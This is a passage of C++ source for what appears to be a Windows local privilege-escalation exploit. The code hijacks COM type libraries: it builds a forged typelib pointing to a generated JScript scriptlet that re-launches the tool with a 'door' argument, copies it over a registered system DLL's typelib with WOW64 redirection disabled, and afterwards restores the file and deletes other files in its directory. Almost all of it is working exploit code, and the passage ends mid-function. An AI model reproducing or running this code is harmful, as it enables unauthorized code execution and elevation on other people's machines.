
#define RPC_USE_NATIVE_WCHAR

#include "stdafx.h"




struct THREAD_PARM
{
	HANDLE Reader;
	HANDLE Writer;
};

#pragma comment(lib, "shlwapi.lib")

#define MIDL_DEFINE_GUID(type,name,l,w1,w2,b1,b2,b3,b4,b5,b6,b7,b8) \
        const type name = {l,w1,w2,{b1,b2,b3,b4,b5,b6,b7,b8}}


static int FileCount = 0;
static IID IID_InterfaceTemp;
static  wchar_t g_dllPathBak[LEN];


_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob, __uuidof(IBackgroundCopyJob));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyManager, __uuidof(IBackgroundCopyManager));
_COM_SMARTPTR_TYPEDEF(IBackgroundCopyJob2, __uuidof(IBackgroundCopyJob2));
_COM_SMARTPTR_TYPEDEF(IEnumBackgroundCopyJobs, __uuidof(IEnumBackgroundCopyJobs));


extern "C"  handle_t hBinding = NULL;




void do_error(RPC_STATUS status)
{
	printf("Error. ");
	ExitProcess(1);
}



bstr_t GetExePath()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	return bstr_t(curr_path);
}

DWORD WINAPI ThreadProc(LPVOID lpParam){
	BYTE b[1030];
	DWORD d = 0;
	THREAD_PARM *tp = (THREAD_PARM*)lpParam;
	while (ReadFile(tp->Reader, b, 1024, &d, 0))
	{
		WriteFile(tp->Writer, b, d, &d, 0);
	}
	return 0;
}


static bstr_t IIDToBSTR(REFIID riid)
{
	LPOLESTR str;
	bstr_t ret = "Unknown";
	if (SUCCEEDED(StringFromIID(riid, &str)))
	{
		ret = str;
		CoTaskMemFree(str);
	}
	return ret;


}




class SafeScopedHandle
{
	HANDLE _h;
public:
	SafeScopedHandle() : _h(nullptr)
	{
	}

	SafeScopedHandle(SafeScopedHandle& h)
	{
		_h = h._h;
		h._h = nullptr;
	}

	SafeScopedHandle(SafeScopedHandle&& h) {
		_h = h._h;
		h._h = nullptr;
	}

	~SafeScopedHandle()
	{
		if (!invalid())
		{
			CloseHandle(_h);
			_h = nullptr;
		}
	}

	bool invalid() {
		return (_h == nullptr) || (_h == INVALID_HANDLE_VALUE);
	}

	void set(HANDLE h)
	{
		_h = h;
	}

	HANDLE get()
	{
		return _h;
	}

	HANDLE* ptr()
	{
		return &_h;
	}


};





bstr_t GetSystemDrive()
{
	WCHAR windows_dir[MAX_PATH] = { 0 };

	GetWindowsDirectory(windows_dir, MAX_PATH);

	windows_dir[2] = 0;

	return windows_dir;
}

bstr_t GetDeviceFromPath(LPCWSTR lpPath)
{
	WCHAR drive[3] = { 0 };
	drive[0] = lpPath[0];
	drive[1] = lpPath[1];
	drive[2] = 0;

	WCHAR device_name[MAX_PATH] = { 0 };

	if (QueryDosDevice(drive, device_name, MAX_PATH))
	{
		return device_name;
	}
	else
	{
		fflush(stdout);
		printf("[+][x] Error getting device for %ls\n", lpPath);
		exit(1);
	}
}

bstr_t GetSystemDevice()
{
	return GetDeviceFromPath(GetSystemDrive());
}

bstr_t GetExe()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	return curr_path;
}

bstr_t GetExeDir()
{
	WCHAR curr_path[MAX_PATH] = { 0 };
	GetModuleFileName(nullptr, curr_path, MAX_PATH);
	PathRemoveFileSpec(curr_path);

	return curr_path;
}

bstr_t GetCurrentPath()
{
	bstr_t curr_path = GetExeDir();

	bstr_t ret = GetDeviceFromPath(curr_path);

	ret += &curr_path.GetBSTR()[2];

	return ret;
}


static HRESULT Check(HRESULT hr)
{
	if (FAILED(hr))
	{
		throw _com_error(hr);
	}
	return hr;
}


// {D487789C-32A3-4E22-B46A-C4C4C1C2D3E0}
static const GUID IID_BaseInterface =
{ 0xd487789c, 0x32a3, 0x4e22, { 0xb4, 0x6a, 0xc4, 0xc4, 0xc1, 0xc2, 0xd3, 0xe0 } };

// {6C6C9F33-AE88-4EC2-BE2D-449A0FFF8C02}
static const GUID TypeLib_BaseInterface =
{ 0x6c6c9f33, 0xae88, 0x4ec2, { 0xbe, 0x2d, 0x44, 0x9a, 0xf, 0xff, 0x8c, 0x2 } };

const wchar_t x[] = L"ABC";

const wchar_t scriptlet_start[] = L"<?xml version='1.0'?>\r\n<package>\r\n<component id='giffile'>\r\n"
L"<registration description='Dummy' progid='giffile' version='1.00' remotable='True'>\r\n"\
L"</registration>\r\n"\
L"<script language='JScript'>\r\n"\
L"<![CDATA[\r\n"\
L"  new ActiveXObject('Wscript.Shell').exec('";

const wchar_t scriptlet_end[] = L"');\r\n"\
L"]]>\r\n"\
L"</script>\r\n"\
L"</component>\r\n"\
L"</package>\r\n";


class ChaHua
{


	BSTR target_tlb_dest = (BSTR)malloc(LEN);
	PExploitData data = (PExploitData)malloc(sizeof(ExploitData));

	~ChaHua(){};
public:

	ChaHua(IID IID_IInterface, BSTR IInterface_name = nullptr, IID IID_TypeLib = GUID_NULL, BSTR dllPathFrom = nullptr)
	{

		data->IID_Interface = IID_IInterface;
		if (IInterface_name)
		{
			wcscpy(data->Interface_Name, IInterface_name);
		}

		data->TypeLib_Interface = IID_TypeLib;
		if (dllPathFrom)
		{
			wcscpy(data->dllPath, dllPathFrom);
		}
		else
		{
			wcscpy(data->dllPath, L"");
		}

		wcscpy(data->extPath, L"");

	}

	ChaHua(BSTR dllPathFrom = nullptr, BSTR extPathFrom = nullptr)
	{

		if (dllPathFrom)
		{
			wcscpy(data->dllPath, dllPathFrom);
		}
		else
		{
			wcscpy(data->dllPath, L"");
		}

		if (extPathFrom)
		{
			wcscpy(data->extPath, extPathFrom);
		}
		else
		{
			wcscpy(data->extPath, L"");
		}
	}


	HRESULT Init()
	{
		return  S_OK;
	}
	GUID* GetFakeIID_IInterface()
	{
		return &data->IID_Interface;
	}

	void MakeTempTypelib(bstr_t filename, bstr_t if_name, REFGUID typelib_guid, REFGUID iid, ITypeLib* ref_typelib, REFGUID ref_iid)
	{
		DeleteFile(filename);
		ICreateTypeLib2Ptr tlb;
		Check(CreateTypeLib2(SYS_WIN32, filename, &tlb));
		//Check(CreateTypeLib2(SYS_WIN64, filename, &tlb));
		tlb->SetGuid(typelib_guid);

		ITypeInfoPtr ref_type_info;
		Check(ref_typelib->GetTypeInfoOfGuid(ref_iid, &ref_type_info));

		ICreateTypeInfoPtr create_info;
		Check(tlb->CreateTypeInfo(if_name, TKIND_INTERFACE, &create_info));
		Check(create_info->SetTypeFlags(TYPEFLAG_FDUAL | TYPEFLAG_FOLEAUTOMATION));
		HREFTYPE ref_type;
		Check(create_info->AddRefTypeInfo(ref_type_info, &ref_type));
		Check(create_info->AddImplType(0, ref_type));
		Check(create_info->SetGuid(iid));
		Check(tlb->SaveAllChanges());
	}

	std::vector<BYTE> ReadFileByPath(bstr_t path)
	{
		SafeScopedHandle hFile;
		hFile.set(CreateFile(path, GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr));
		if (hFile.invalid())
		{
			throw _com_error(E_FAIL);
		}
		DWORD size = GetFileSize(hFile.get(), nullptr);
		std::vector<BYTE> ret(size);
		if (size > 0)
		{
			DWORD bytes_read;
			if (!ReadFile(hFile.get(), ret.data(), size, &bytes_read, nullptr) || bytes_read != size)
			{
				throw _com_error(E_FAIL);
			}
		}

		return ret;
	}

	void WriteFileByString(bstr_t path, const char* data)
	{
		const BYTE* bytes = reinterpret_cast<const BYTE*>(data);
		std::vector<BYTE> data_buf(bytes, bytes + strlen(data));
		WriteFileByData(path, data_buf);
	}
	void WriteFileByData(bstr_t path, const std::vector<BYTE> data)
	{
		SafeScopedHandle hFile;
		hFile.set(CreateFile(path, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr));
		if (hFile.invalid())
		{
			throw _com_error(E_FAIL);
		}

		if (data.size() > 0)
		{
			DWORD bytes_written;
			if (!WriteFile(hFile.get(), data.data(), data.size(), &bytes_written, nullptr) || bytes_written != data.size())
			{
				throw _com_error(E_FAIL);
			}
		}
	}

	BOOL  ExploitCopyFile(bool shellmode){

		char* cmdstr = (char*)malloc(LEN);
		bstr_t dllPathBak = GetExeDir() + L"\\" + PathFindFileName(data->dllPath) + ".bak";

		wcscpy(g_dllPathBak, dllPathBak.GetBSTR());
		
		PVOID oldval = nullptr;
		
		

		if (shellmode)
		{

			if (Wow64DisableWow64FsRedirection(&oldval))
			{
				if (!CopyFileW(data->dllPath, g_dllPathBak, false))
				{
					printf("[+]Copy Back File Failed ,Check Run As Administrator Rights\n");
				}
				if (!CopyFileW(target_tlb_dest, data->dllPath, false))
				{


					printf("[+]CopyFileW Failed ,Check Run As Administrator Rights\n");
				}
				
				Wow64RevertWow64FsRedirection(oldval);
				return TRUE;
				
			}else
			{
				printf("[+]Wow64DisableWow64FsRedirection Failed\n");
			}
		
			return TRUE;
		}
		else
		{

			if (!CopyFileW(data->dllPath, g_dllPathBak, false))
			{
				printf("[+]Copy Back File Failed ,Check Run As Administrator Rights\n");
			}

			printf("[+]CopyFileW %ls,%ls\n", target_tlb_dest, data->dllPath);
			if (CopyFileW(target_tlb_dest, data->dllPath, false))
			{


				return TRUE;
			}
			else
			{
				printf("[+]Run Exploit Failed ,Check Run As Administrator Rights\n");
				return  FALSE;
			}
		}
	}

	BOOL RestoreExploitFile(bool shellmode)
	{
		PVOID oldval = nullptr;


		if (shellmode)
		{

			if (!Wow64DisableWow64FsRedirection(&oldval))
			{
				printf("[+]Wow64DisableWow64FsRedirection Failed\n");
				return FALSE;
			}

		}
		printf("[+]Restoring File %ls,%ls\n", g_dllPathBak, data->dllPath);
		if (CopyFileW(g_dllPathBak, data->dllPath, false))
		{

			bstr_t exeDir = GetExeDir();		

			bstr_t exeName = PathFindFileName(GetExe());

			printf("[+]Restoring BackUp DLL Done,Do CleanUp... \n");	

			DirectoryListCleanUp(exeDir, exeName);
			if (shellmode)
			{
				Wow64RevertWow64FsRedirection(oldval);
			
			}
			return TRUE;
		}
		else
		{
			if (shellmode)
			{
				Wow64RevertWow64FsRedirection(oldval);

			}
			printf("[+]Run Exploit Failed,Check Run As Administrator \n");
			return  FALSE;
		}
		
	}



	BOOL  DirectoryListCleanUp(BSTR Path, BSTR ExeName)
	{
		if (!PathIsDirectoryW(Path))
		{

			return FALSE;
		}
		WIN32_FIND_DATAW FindData;
		HANDLE hError;

		BSTR FilePathName = (BSTR)malloc(LEN);
		// 构造路径
		bstr_t FullPathName;
		wcscpy(FilePathName, Path);
		wcscat(FilePathName, L"\\*.*");
		hError = FindFirstFile(FilePathName, &FindData);
		if (hError == INVALID_HANDLE_VALUE)
		{
			//printf("[+]Enumerating %ls Failed Try To Skip, code: %d,error: %d\n", FilePathName, GetLastError(), hError);
			return 0;
		}
		while (::FindNextFile(hError, &FindData))
		{
			// 过虑.和..
			if (_wcsicmp(FindData.cFileName, L".") == 0
				|| _wcsicmp(FindData.cFileName, L"..") == 0)
			{
				continue;
			}
			FullPathName = bstr_t(Path) + "\\" + FindData.cFileName;
			// 构造完整路径
			if (_wcsicmp(ExeName, FindData.cFileName) != 0)
			{
				//printf("%ls\n", FullPathName.GetBSTR());

				DeleteFile(FullPathName);
			}
			//wsprintf(FullPathName, L"%s\\%s", Path, FindData.cFileName);
			//FileCount++;
			// 输出本级的文件

			if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				DirectoryListCleanUp(FullPathName, ExeName);
			}
		}
		return FALSE;
	}
	
	void BuildTypeLibsWrapper(BSTR script_path)
	{
		//当前目录下的临时typelib
		bstr_t target_tlb = GetExeDir() + L"\\" + PathFindFileName(data->dllPath);
		printf("[+]Building TypeLib:%ls \n", target_tlb.GetBSTR());
		bstr_t script;
		if (script_path)
		{
			script = script_path;

		}
		else
		{
			script = L"script:" + CreateScriptletFile();
		}
		BuildTypeLibs(script, data->Interface_Name, target_tlb);
		wcscpy(target_tlb_dest, target_tlb.GetBSTR());
	}
	BSTR GetDllPath()
	{
		return _wcsdup(data->dllPath);
	}
	void BuildTypeLibs(LPCSTR script_path, bstr_t if_name, bstr_t target_tlb)
	{

		try{

			ITypeLibPtr stdole2;
			Check(LoadTypeLib(L"stdole2.tlb", &stdole2));

			fflush(stdout);

			unsigned int len = strlen(script_path);

			bstr_t buf = GetExeDir() + L"\\";
			for (unsigned int i = 0; i < len; ++i)
			{
				buf += L"A";
			}

			MakeTempTypelib(buf, "IBadger", TypeLib_BaseInterface, IID_BaseInterface, stdole2, IID_IDispatch);
			ITypeLib* abc;
			Check(LoadTypeLib(buf, &abc));


			bstr_t built_tlb = GetExeDir() + L"\\output.tlb";
			MakeTempTypelib(built_tlb, if_name, data->TypeLib_Interface, data->IID_Interface, abc, IID_BaseInterface);

			std::vector<BYTE> tlb_data = ReadFileByPath(built_tlb);
			for (size_t i = 0; i < tlb_data.size() - len; ++i)
			{
				bool found = true;
				for (unsigned int j = 0; j < len; j++)
				{
					if (tlb_data[i + j] != 'A')
					{
						found = false;
					}
				}

				if (found)
				{
					fflush(stdout);
					printf("[+]Typelib:%s,%ls,%ls \n", script_path, if_name.GetBSTR(), IIDToBSTR(data->TypeLib_Interface).GetBSTR());


					memcpy(&tlb_data[i], script_path, len);
					break;
				}
			}


			WriteFileByData(target_tlb, tlb_data);
			abc->Release();
			DeleteFile(buf);
			DeleteFile(built_tlb);
		}
		catch (const _com_error& err)
		{
			printf("[+]Error BuildT ypeLibs: %ls\n", err.ErrorMessage());
		}
	}

	bstr_t CreateScriptletFile()
	{
		bstr_t script_file = GetExeDir() + L"\\run.sct";
		bstr_t script_data = scriptlet_start;
		bstr_t exe_file = GetExe();
		wchar_t* p = exe_file;
		while (*p)
		{
			if (*p == '\\')
			{
				*p = '/';
			}
			p++;
		}

		DWORD session_id;
		ProcessIdToSessionId(GetCurrentProcessId(), &session_id);
		WCHAR session_str[16];
		StringCchPrintf(session_str, _countof(session_str), L"%d", session_id);

		script_data += L"\"" + exe_file + L"\" door " + session_str + scriptlet_end;

		WriteFileByString(script_file, script_data);

		return script_file;
	}



	HRESULT ReQueryPathOfRegTypeLibWrapper(BOOL ForDeep)
	{
		BSTR pdllPathFake = (BSTR)malloc(LEN);
		HRESULT hr = ReQueryPathOfRegTypeLib(data->TypeLib_Interface, 3, 0, 0, &pdllPathFake, ForDeep);

		if (SUCCEEDED(hr))
		{

			wcscpy(data->dllPath, pdllPathFake);
		}

		return hr;
	}
	HRESULT ReQueryPathOfRegTypeLib(REFGUID guid, USHORT wMaj, USHORT wMin,
		LCID lcid, _Out_ BSTR* dllPathFrom, BOOL ForDeep)
	{
		HRESULT hr = S_OK;


		hr = QueryPathOfRegTypeLib(guid, 1, 0, 0, dllPathFrom);
		if (FAILED(hr))
		{
			if (!ForDeep)
			{
				printf("[+]QueryPathOfRegTypeLib Failed Result: %08X\n", hr);
			}

			hr = QueryPathOfRegTypeLib(guid, 2, 0, 0, dllPathFrom);
			if (FAILED(hr))
			{
				if (!ForDeep)
				{
					printf("[+]QueryPathOfRegTypeLib Failed Result: %08X\n", hr);
				}
				hr = QueryPathOfRegTypeLib(guid, 3, 0, 0, dllPathFrom);
				if (FAILED(hr))
				{
					hr = QueryPathOfRegTypeLib(guid, wMaj, wMin, 0, dllPathFrom);
					if (FAILED(hr))
					{
						if (!ForDeep)
						{
							printf("[+]QueryPathOfRegTypeLib Failed Result: %08X\n", hr);
						}
						return hr;
					}
				}

			}
		}

		return hr;
	}

	BOOL CheckDllPathCompare(BSTR dllPathOrg)
	{
		//解决路径不合法问题
		//wcscpy(dllPath, argv[3]);
		if (!_wcsicmp(data->dllPath, dllPathOrg) == 0)
		{
			printf("[+][waring] registered dllPath Not Match 1%ls:,2:%ls, \n", dllPathOrg, data->dllPath);
			return FALSE;
		}
		return TRUE;
	}

	BOOL GetRegTypeInfoOfIIDWrapper(BOOL ForDeep)
	{

		return  GetRegTypeInfoOfIID(data->IID_Interface, data->Interface_Name, data->dllPath, &data->TypeLib_Interface, ForDeep);
	}
	BOOL GetRegTypeInfoOfIID(IID IID_ToFind, BSTR if_name, BSTR dllPathFake, IID* TypeLib_Ret, BOOL ForDeep)
	{
		BSTR pdllPathFake = (BSTR)malloc(LEN);
		HRESULT hr = S_OK;
		HKEY  hkResult;
		UINT32 fisrtVer = 3;
		UINT32 nextVer = 0;
		UINT32 versionLookUp = 0;
		UINT32 versionLookUpNext = 0;
		DWORD dwIndex = 0;
		HKEY subKey = NULL;
		LPWSTR  TypeLibValue = (LPWSTR)malloc(LEN);
		LPWSTR  InterfaceValue = (LPWSTR)malloc(LEN);
		LPWSTR  InterfaceVersion = (LPWSTR)malloc(LEN);
		LPWSTR  EndPtr = (LPWSTR)malloc(LEN);
		LPWSTR  SubKeyName = (LPWSTR)malloc(LEN);
		LPWSTR  SubKey = (LPWSTR)malloc(LEN);
		BOOL FoundVersion = FALSE;
		BOOL UseDefaultTypelib = TRUE;
		DWORD pcbData = LEN;
		DWORD pcbData2 = LEN;
		DWORD pcbData3 = LEN;
		DWORD pcbData4 = LEN;
		DWORD pcbData5 = LEN;
		ITypeLib * ptlib = nullptr;
		ITypeInfo *pTinfo = nullptr;
		LSTATUS  errCode = ERROR_SUCCESS;
		bstr_t InterfacePath = SysAllocString(L"Interface\\");
		bstr_t InterfacePath64 = SysAllocString(L"Wow6432Node\\Interface\\");
		bstr_t InterfaceTypeLibRoot = SysAllocString(L"TypeLib\\");
		bstr_t InterfaceTypeLibWin;
		bstr_t IID_IAddinDesignerStr = IIDToBSTR(IID_ToFind);

		bstr_t InterfacePathGuid = InterfacePath + IID_IAddinDesignerStr;
		if (!ForDeep)
		{
			//printf("[+]RegOpenKey InterfacePathGuid %ls\n", InterfacePathGuid.GetBSTR());

		}

		errCode = RegGetValueW(HKEY_CLASSES_ROOT, InterfacePathGuid, nullptr, RRF_RT_REG_SZ, NULL, InterfaceValue, &pcbData);
		if (errCode == ERROR_SUCCESS)
		{


			wcscpy(if_name, InterfaceValue);
			if (!ForDeep)
			{
				printf("[+]Found InterfaceName:%ls\n", InterfaceValue);
			}


			bstr_t InterfacePathEnd = SysAllocString(L"\\TypeLib");

			bstr_t InterfacePathAll = InterfacePathGuid + InterfacePathEnd;
			if (!ForDeep)
			{
				//printf("[+]RegOpenKey InterfacePathAll %ls\n", InterfacePathAll.GetBSTR());
			}


			errCode = RegGetValueW(HKEY_CLASSES_ROOT, InterfacePathAll, nullptr, RRF_RT_REG_SZ, NULL, TypeLibValue, &pcbData2);
			if (errCode != ERROR_SUCCESS)
			{
				if (!ForDeep)
				{
					printf("[+]RegOpenKey TypeLib Failed, code: %d,error: %d\n", GetLastError(), errCode);
				}
				return FALSE;
			}
			CLSIDFromString(TypeLibValue, TypeLib_Ret);
			if (!ForDeep)
			{
				printf("[+]Found TypeLibGUID: %ls\n", TypeLibValue);
			}

			errCode = RegGetValueW(HKEY_CLASSES_ROOT, InterfacePathAll, L"Version", RRF_RT_REG_SZ, NULL, InterfaceVersion, &pcbData3);
			if (errCode == ERROR_SUCCESS)
			{
				fisrtVer = wcstoul(InterfaceVersion, &EndPtr, 16);

				if (*EndPtr == '.')
				{


					LPWSTR EndPtrNext = EndPtr + 1;

					nextVer = wcstoul(EndPtrNext, 0, 16);

				}
				FoundVersion = TRUE;
			}
			else
			{

				if (!ForDeep)
				{
					printf("[+]RegOpenKey TypeLib Version Failed, code: %d,error: %d\n", GetLastError(), errCode);
				}
				return FALSE;
			}
		}
		else
		{
			InterfacePathGuid = InterfacePath64 + IID_IAddinDesignerStr;

			errCode = RegGetValueW(HKEY_CLASSES_ROOT, InterfacePathGuid, nullptr, RRF_RT_REG_SZ, NULL, InterfaceValue, &pcbData);
			if (errCode != ERROR_SUCCESS)
			{
				if (!ForDeep)
				{
					printf("[+]RegOpenKey InterfaceName Failed, code: %d,error: %d\n", GetLastError(), errCode);
				}
				return FALSE;
			}

			wcscpy(if_name, InterfaceValue);
			if (!ForDeep)
			{
				printf("[+]Found InterfaceName:%ls\n", InterfaceValue);
			}


			bstr_t InterfacePathEnd = SysAllocString(L"\\TypeLib");

			bstr_t InterfacePathAll = InterfacePathGuid + InterfacePathEnd;
			if (!ForDeep)
			{
				//printf("[+]RegOpenKey InterfacePathAll %ls\n", InterfacePathAll.GetBSTR());
			}


			errCode = RegGetValueW(HKEY_CLASSES_ROOT, InterfacePathAll, nullptr, RRF_RT_REG_SZ, NULL, TypeLibValue, &pcbData2);
			if (errCode != ERROR_SUCCESS)
			{
				if (!ForDeep)
				{
					printf("[+]RegOpenKey TypeLib Failed, code: %d,error: %d\n", GetLastError(), errCode);
				}
				return FALSE;
			}
			CLSIDFromString(TypeLibValue, TypeLib_Ret);
			if (!ForDeep)
			{
				printf("[+]Found TypeLibGUID: %ls\n", TypeLibValue);
			}

			errCode = RegGetValueW(HKEY_CLASSES_ROOT, InterfacePathAll, L"Version", RRF_RT_REG_SZ, NULL, InterfaceVersion, &pcbData3);
			if (errCode == ERROR_SUCCESS)
			{
				fisrtVer = wcstoul(InterfaceVersion, &EndPtr, 16);

				if (*EndPtr == '.')
				{


					LPWSTR EndPtrNext = EndPtr + 1;

					nextVer = wcstoul(EndPtrNext, 0, 16);

				}
				FoundVersion = TRUE;
			}
			else
			{

				if (!ForDeep)
				{
					printf("[+]RegOpenKey TypeLib Version Failed, code: %d,error: %d\n", GetLastError(), errCode);
				}
				return FALSE;
			}

		}
		bstr_t InterfaceTypeLibRootAll = InterfaceTypeLibRoot + TypeLibValue;
		if (!FoundVersion)
		{


			hr = ReQueryPathOfRegTypeLib(*TypeLib_Ret, 3, 0, 0, &pdllPathFake, ForDeep);
			if (FAILED(hr))
			{
				if (!ForDeep)
				{
					printf("[+]QueryPathOfRegTypeLib Failed Result: %08X\n", hr);
				}
				return FALSE;
			}
		}
		else
		{

			errCode = RegOpenKeyW(HKEY_CLASSES_ROOT, InterfaceTypeLibRootAll, &subKey);
			if (errCode == ERROR_SUCCESS)
			{
				UseDefaultTypelib = TRUE;
				for (dwIndex = 0; !RegEnumKeyW(subKey, dwIndex, SubKeyName, 0xDu); ++dwIndex)
				{
					versionLookUp = wcstoul(SubKeyName, &EndPtr, 16);
					if (*EndPtr == '.')
					{
						if ((versionLookUpNext = wcstoul(EndPtr + 1, 0, 16), !FoundVersion) && versionLookUp > fisrtVer
							|| versionLookUp == fisrtVer && versionLookUpNext >= nextVer)
						{
							UseDefaultTypelib = FALSE;
							wcscpy(SubKey, SubKeyName);

						}
					}
				}


				if (!UseDefaultTypelib)
				{
					bstr_t InterfaceTypeLibSubkey = InterfaceTypeLibRootAll + "\\" + SubKey + "\\0";
					errCode = RegOpenKeyW(HKEY_CLASSES_ROOT, InterfaceTypeLibSubkey, &subKey);
					if (errCode != ERROR_SUCCESS)
					{
						if (!ForDeep)
						{
							printf("[+]RegOpenKey Subkey TypeLib Failed, code: %d,error: %d\n", GetLastError(), errCode);
						}

						UseDefaultTypelib = TRUE;
					}
					else{

						for (dwIndex = 0; !RegEnumKeyW(subKey, dwIndex, SubKeyName, 0xDu); ++dwIndex)
						{
							InterfaceTypeLibWin = InterfaceTypeLibSubkey + "\\" + SubKeyName;
							if (_wcsicmp(SubKeyName, L"win64") == 0 || _wcsicmp(SubKeyName, L"win32") == 0)
							{

								break;
							}
						}
						errCode = RegGetValueW(HKEY_CLASSES_ROOT, InterfaceTypeLibWin, nullptr, RRF_RT_REG_SZ, NULL, pdllPathFake, &pcbData4);
						if (errCode == ERROR_SUCCESS)
						{
							UseDefaultTypelib = FALSE;
						}
						else{
							UseDefaultTypelib = TRUE;
						}
					}
				}
				else
				{
					UseDefaultTypelib = TRUE;
				}


			}
			else
			{
				UseDefaultTypelib = TRUE;
			}
			if (UseDefaultTypelib)
			{
				if (!ForDeep)
				{
					printf("[+]RegOpenKey TypeLib Failed Use Default Typelib, code: %d,error: %d\n", GetLastError(), errCode);
				}
				hr = ReQueryPathOfRegTypeLib(*TypeLib_Ret, fisrtVer, nextVer, 0, &pdllPathFake, ForDeep);
				if (FAILED(hr))
				{
					if (!ForDeep)
					{
						printf("[+]QueryPathOfRegTypeLib Failed Result: %08X\n", hr);
					}
					return FALSE;
				}
			}
		}

		ExpandEnvironmentStringsW(pdllPathFake, dllPathFake, LEN);
		if (!ForDeep)
		{
			printf("[+]Found matched dllPath: %ls,Result: %08X\n", dllPathFake, hr);
		}

		hr = LoadTypeLib(dllPathFake, &ptlib);
		if (FAILED(hr))
		{
			if (!ForDeep)
			{
				printf("[+]LoadTypeLib Failed Result: %08X\n", hr);
			}
			return FALSE;
		}
		hr = ptlib->GetTypeInfoOfGuid(IID_ToFind, &pTinfo);
		if (FAILED(hr))
		{
			if (!ForDeep)
			{
				printf("[+]GetTypeInfoOfGuid Failed Result: %08X\n", hr);
			}
			return FALSE;
		}
		if (pTinfo)
		{
			hr = pTinfo->Release();
			if (FAILED(hr))
			{
				if (!ForDeep)
				{
					printf("[+]TypeInfo Release Failed Result: %08X\n", hr);
				}
				return FALSE;
			}
		}
		if (ptlib)
		{
			hr = ptlib->Release();
			if (FAILED(hr))
			{
				if (!ForDeep)
				{
					printf("[+]LoadTypeLib Release Failed Result: %08X\n", hr);
				}
				return FALSE;
			}
		}
		if (!ForDeep)
		{
			printf("[+]Check LoadTypeLib Done ,Try To Run Rpc Exploit\n", hr);
		}
		return TRUE;
	}
	BOOL GetTypeLibInfoToExploitWrapper(BOOL ForDeep)

	{
		return  GetTypeLibInfoToExploit(data->dllPath, data->Interface_Name, &data->IID_Interface, ForDeep);
	}
	BOOL GetTypeLibInfoToExploit(BSTR dllPathFrom, BSTR if_nameRet, GUID* InterfaceGuid, BOOL ForDeep)
	{
		try{
			HRESULT hr = S_OK;
			BOOL ret = FALSE;
			UINT TypeInfoCount = 0;
			CComQIPtr<ITypeLib> ptlib = nullptr;
			CComQIPtr<ITypeInfo> pTinfo = nullptr;
			TYPEATTR *ppTypeAttr = nullptr;
			TYPEATTR *ppTypeAttrCopy = nullptr;
			TYPEKIND pTKind;
			BSTR  InterfaceName = (BSTR)malloc(LEN);
			BSTR  InterfaceValue = (BSTR)malloc(LEN);
			std::map<BSTR, TYPEATTR*> InterfaceMap;
			std::map<BSTR, TYPEATTR*>::iterator it;
			if (!ForDeep)
			{
				printf("[+]Try To Exploit TypeLibPath: %ls\n", data->dllPath);
			}
			hr = LoadTypeLib(dllPathFrom, &ptlib);
			if (FAILED(hr))
			{
				if (!ForDeep)
				{
					printf("[+]LoadTypeLib Failed, Result: %08X\n", hr);
				}
				return FALSE;
			}
			TypeInfoCount = ptlib->GetTypeInfoCount();
			if (TypeInfoCount == 0)
			{
				if (!ForDeep)
				{
					printf("[+]GetTypeInfoCount Failed ,Result: %08X\n", hr);
				}
				return FALSE;
			}
			if (!ForDeep)
			{
				printf("[+]GetTypeInfoCount Count: %d, Result: %08X\n", TypeInfoCount, hr);
			}
			for (UINT i = 0; i < TypeInfoCount; i++)
			{
				if (pTinfo)
				{
					pTinfo.Release();
				}
				pTinfo = nullptr;
				hr = ptlib->GetTypeInfo(i, &pTinfo);
				if (FAILED(hr))
				{
					if (!ForDeep)
					{
						printf("[+]GetTypeInfoOfGuid Index:%d Failed , Result: %08X\n", i, hr);
					}
					continue;
				}
				hr = ptlib->GetTypeInfoType(i, &pTKind);
				if (FAILED(hr))
				{
					if (!ForDeep)
					{
						printf("[+]GetTypeInfoType Index:%d Failed , Result: %08X\n", i, hr);
					}
					continue;
				}
				if ((pTKind&TKIND_INTERFACE || pTKind&TKIND_DISPATCH) && pTKind != TKIND_COCLASS)
				{
					hr = pTinfo->GetDocumentation(MEMBERID_NIL, &InterfaceName, 0, 0, 0);
					if (FAILED(hr))
					{
						if (!ForDeep)
						{
							printf("[+]GetDocumentation Index:%d Failed , Result: %08X\n", i, hr);
						}
						continue;
					}
					if (wcschr(InterfaceName, L'_') != NULL)
					{
						continue;
					}

					//InterfaceMap

					hr = pTinfo->GetTypeAttr(&ppTypeAttr);
					if (FAILED(hr))
					{
						if (!ForDeep)
						{
							printf("[+]GetTypeAttr Index:%d Failed , Result: %08X\n", i, hr);
						}
						continue;
					}
					ppTypeAttrCopy = (TYPEATTR*)malloc(sizeof(TYPEATTR));
					memcpy(ppTypeAttrCopy, ppTypeAttr, sizeof(TYPEATTR));
					pTinfo->ReleaseTypeAttr(ppTypeAttr);
					ppTypeAttr = nullptr;
					InterfaceMap.insert(std::pair<BSTR, TYPEATTR*>(_wcsdup(InterfaceName), ppTypeAttrCopy));

				}
				else
				{
					continue;
				}

			}
			WORD tempNum = 0;
			for (it = InterfaceMap.begin(); it != InterfaceMap.end(); it++)
			{
				if (it->second->cFuncs > tempNum)
				{
					tempNum = it->second->cFuncs;
				}
			}
			for (it = InterfaceMap.begin(); it != InterfaceMap.end(); it++)
			{

				if (it->second->cFuncs >= tempNum)
				{
					wcscpy(if_nameRet, it->first);
					*InterfaceGuid = it->second->guid;
					ret = TRUE;
					break;
				}


			}
			if (pTinfo)
			{
				pTinfo.Release();
			}
			return ret;
		}
		catch (...)
		{

		}

		return FALSE;
	}


	BOOL CheckTypeLibInfoToExploit(BSTR dllPathFrom, BOOL ForDeep)
	{
		BSTR if_nameFake = (BSTR)malloc(LEN);
		BSTR dllPathFake = (BSTR)malloc(LEN);
		GUID InterfaceGuidFake;
		GUID TypeLibGuidFake;
		if (!GetTypeLibInfoToExploit(dllPathFrom, if_nameFake, &InterfaceGuidFake, ForDeep))
		{
			//printf("[+]Check TypeLib Failed , Invalid  Path \n", hr);
			return FALSE;
		}

		if (!GetRegTypeInfoOfIID(InterfaceGuidFake, if_nameFake, dllPathFake, &TypeLibGuidFake, ForDeep))
		{
			//printf("[+]Check LoadTypeLib Failed \n", hr);
			return FALSE;
		}
		return TRUE;
